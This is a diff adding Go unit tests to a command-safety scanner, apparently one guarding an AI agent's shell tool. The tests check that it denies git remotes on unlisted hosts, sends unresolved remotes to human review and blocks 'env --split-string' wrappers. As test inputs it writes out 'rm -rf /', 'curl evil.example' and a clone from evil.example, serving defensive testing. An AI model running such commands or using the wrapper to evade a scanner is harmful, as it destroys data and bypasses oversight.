@@ -355,6 +355,71 @@ func TestNetworkCommandsRejectLoopbackTargets(t *testing.T) {
 	}
 }
 
+func TestGitNetworkOperationsValidateRemoteHost(t *testing.T) {
+	tests := []struct {
+		name     string
+		command  string
+		decision Decision
+		ruleID   string
+	}{
+		{
+			name:     "deny SCP-like SSH remote",
+			command:  "git clone git@evil.example:org/repo",
+			decision: DecisionDeny,
+			ruleID:   "network.non_whitelisted_domain",
+		},
+		{
+			name:     "allow whitelisted SCP-like SSH remote",
+			command:  "git clone git@github.com:trpc-group/trpc-agent-go.git",
+			decision: DecisionAllow,
+		},
+		{
+			name:     "review unresolved remote alias",
+			command:  "git fetch origin",
+			decision: DecisionNeedsHumanReview,
+			ruleID:   "network.unresolved_target",
+		},
+		{
+			name:     "allow local operation",
+			command:  "git status",
+			decision: DecisionAllow,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  tt.command,
+			}, DefaultPolicy())
+			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
+				t.Fatalf("unexpected Git network report: %+v", report)
+			}
+		})
+	}
+}
+
+func TestEnvSplitStringFailsClosed(t *testing.T) {
+	commands := []string{
+		"env -S 'rm -rf /'",
+		"env --split-string 'curl evil.example'",
+	}
+	for _, command := range commands {
+		t.Run(command, func(t *testing.T) {
+			report := Scan(Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			}, DefaultPolicy())
+			if report.Decision != DecisionDeny ||
+				report.RuleID != "shell.env_split_string" {
+				t.Fatalf("env split-string payload should fail closed: %+v", report)
+			}
+		})
+	}
+}
+
 func TestDeniedPathsIncludeOptionValuesAndDotenvVariants(t *testing.T) {
 	commands := []string{
 		"node --env-file=.env app.js",
@@ -1266,6 +1331,16 @@ func TestUnwrapCommandVariants(t *testing.T) {
 			want: nil,
 		},
 		{
+			name: "env split string short",
+			argv: []string{"env", "-S", "curl evil.example"},
+			want: nil,
+		},
+		{
+			name: "env split string long assignment",
+			argv: []string{"env", "--split-string=curl evil.example"},
+			want: nil,
+		},
+		{
 			name: "command flags",
 			argv: []string{"command", "-p", "--", "curl", "evil.example"},
 			want: []string{"curl", "evil.example"},
@@ -1331,6 +1406,16 @@ func TestContainsNetworkCommandVariants(t *testing.T) {
 			name: "direct",
 			argv: []string{"curl", "evil.example"},
 			want: true,
+		},
+		{
+			name: "Git SSH remote",
+			argv: []string{"git", "clone", "git@evil.example:org/repo"},
+			want: true,
+		},
+		{
+			name: "Git local operation",
+			argv: []string{"git", "status"},
+			want: false,
 		},
 		{
 			name: "env options and assignment",
